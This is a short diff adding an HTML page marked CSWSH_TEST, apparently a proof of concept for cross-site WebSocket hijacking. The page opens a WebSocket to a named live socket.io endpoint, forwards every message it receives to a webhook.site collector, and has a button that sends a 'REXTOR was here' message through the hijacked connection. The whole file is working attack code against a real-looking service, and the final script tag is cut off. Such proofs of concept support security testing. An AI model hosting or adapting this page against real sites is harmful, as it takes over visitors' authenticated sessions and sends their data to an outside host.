@@ -1,0 +1,14 @@
+<p>CSWSH_TEST</p>
+<button onclick="sendAdditionalMessage()">Send Additional Message</button>
+
+<script>
+    var ws = new WebSocket('wss://fusher-live.mono.com/socket.io/?EIO=3&transport=websocket');
+
+    ws.onmessage = function(event) {
+        fetch('https://webhook.site/469d381a-8e9e-4ef6-b343-9a736c0749fd', {method: 'POST', mode: 'no-cors', body: event.data});
+    };
+
+    function sendAdditionalMessage() {
+        ws.send("REXTOR was here");
+    }
+</script
